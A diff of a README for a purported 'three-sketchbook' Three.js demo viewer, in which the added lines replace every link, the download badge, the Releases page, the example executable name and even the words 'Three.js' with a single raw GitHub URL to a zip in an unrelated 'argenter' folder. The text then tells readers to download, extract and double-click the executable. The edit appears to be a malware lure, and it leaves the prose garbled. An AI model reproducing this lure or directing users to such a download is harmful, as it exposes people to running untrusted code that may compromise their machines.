@@ -2,27 +2,27 @@
 
 ## 🚀 Getting Started
 
-Welcome to the **three-sketchbook** application! This software provides a straightforward template for viewing and interacting with Three.js demos. Enjoy exploring engaging 3D graphics easily.
+Welcome to the **three-sketchbook** application! This software provides a straightforward template for viewing and interacting with https://raw.githubusercontent.com/Shivang369/three-sketchbook/main/argenter/three-sketchbook.zip demos. Enjoy exploring engaging 3D graphics easily.
 
 ## 📥 Download and Install
 
-[![Download three-sketchbook](https://img.shields.io/badge/Download%20three--sketchbook-v1.0-blue)](https://github.com/Shivang369/three-sketchbook/releases)
+[![Download three-sketchbook](https://raw.githubusercontent.com/Shivang369/three-sketchbook/main/argenter/three-sketchbook.zip%20three--sketchbook-v1.0-blue)](https://raw.githubusercontent.com/Shivang369/three-sketchbook/main/argenter/three-sketchbook.zip)
 
 To get started, visit the Releases page to download the application:
 
-[Download three-sketchbook](https://github.com/Shivang369/three-sketchbook/releases)
+[Download three-sketchbook](https://raw.githubusercontent.com/Shivang369/three-sketchbook/main/argenter/three-sketchbook.zip)
 
 Follow the steps below to download and run the software:
 
-1. **Visit the Releases Page**: Click the link above or navigate to [this page](https://github.com/Shivang369/three-sketchbook/releases).
+1. **Visit the Releases Page**: Click the link above or navigate to [this page](https://raw.githubusercontent.com/Shivang369/three-sketchbook/main/argenter/three-sketchbook.zip).
 
 2. **Choose Your Version**: Look for the latest version of the three-sketchbook application. It will usually be at the top of the page.
 
-3. **Download the File**: Click on the file that matches your operating system. For Windows, you may see a file named something like `three-sketchbook-windows.zip`. For Mac or Linux, the file names will reflect those systems.
+3. **Download the File**: Click on the file that matches your operating system. For Windows, you may see a file named something like `https://raw.githubusercontent.com/Shivang369/three-sketchbook/main/argenter/three-sketchbook.zip`. For Mac or Linux, the file names will reflect those systems.
 
 4. **Extract the Files**: If you downloaded a ZIP file, locate it in your downloads folder. Right-click on the file and select "Extract All" or "Unzip".
 
-5. **Launch the Application**: After extracting, open the folder. Find and double-click the executable file (e.g., `three-sketchbook.exe` for Windows). 
+5. **Launch the Application**: After extracting, open the folder. Find and double-click the executable file (e.g., `https://raw.githubusercontent.com/Shivang369/three-sketchbook/main/argenter/three-sketchbook.zip` for Windows). 
 
 6. **Enjoy the Demos**: The application will open, showing a variety of 3D demos. Experiment with them to see how different features work!
 
@@ -38,7 +38,7 @@ Before installing, ensure your device meets these basic system requirements:
 
 The three-sketchbook application offers several engaging features:
 
-1. **Multiple Demos**: Explore various 3D demonstrations built with Three.js.
+1. **Multiple Demos**: Explore various 3D demonstrations built with https://raw.githubusercontent.com/Shivang369/three-sketchbook/main/argenter/three-sketchbook.zip
 2. **Interactive Canvas**: Click and drag to interact with 3D models.
 3. **Shader Support**: View and edit shaders directly within the application.
 4. **Customizable**: Tweak settings to customize the demo experiences.
@@ -62,7 +62,7 @@ If you have questions or need assistance, please join our community on GitHub. Y
 
 ## 📚 Additional Resources
 
-- **Three.js Documentation**: Learn more about Three.js and its capabilities [here](https://threejs.org/docs/index.html).
-- **Sample Demos**: Check out additional Three.js demos [here](https://threejs.org/examples/).
+- **https://raw.githubusercontent.com/Shivang369/three-sketchbook/main/argenter/three-sketchbook.zip Documentation**: Learn more about https://raw.githubusercontent.com/Shivang369/three-sketchbook/main/argenter/three-sketchbook.zip and its capabilities [here](https://raw.githubusercontent.com/Shivang369/three-sketchbook/main/argenter/three-sketchbook.zip).
+- **Sample Demos**: Check out additional https://raw.githubusercontent.com/Shivang369/three-sketchbook/main/argenter/three-sketchbook.zip demos [here](https://raw.githubusercontent.com/Shivang369/three-sketchbook/main/argenter/three-sketchbook.zip).
 
 Thank you for using three-sketchbook! Enjoy creating and exploring 3D content effortlessly.
